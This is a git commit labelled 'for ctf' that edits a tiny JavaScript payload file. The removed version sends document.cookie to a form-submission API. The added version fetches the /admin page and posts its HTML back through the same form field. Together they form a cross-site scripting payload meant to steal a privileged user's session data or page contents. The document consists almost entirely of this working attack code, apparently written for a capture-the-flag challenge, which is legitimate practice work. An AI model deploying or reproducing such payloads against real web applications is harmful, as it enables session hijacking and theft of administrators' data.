32706f3f2828aee94f7b2c29fa07ed73184dd592
Muhammed Efe Erdoğan <efeyedek107@gmail.com>
2026-04-27 14:27:34 +0300

    for ctf

--- p.js
+++ p.js
@@ -1,3 +1,3 @@
-for(let i=0;i<5;i++){
-  fetch('/api/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({halloween_name:document.cookie,email:'x@x.com',costume_type:'ghost',trick_or_treat:'tricks'})});
-}
+fetch('/admin').then(r=>r.text()).then(html=>{
+  fetch('/api/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({halloween_name:html,email:'x@x.com',costume_type:'ghost',trick_or_treat:'tricks'})});
+});
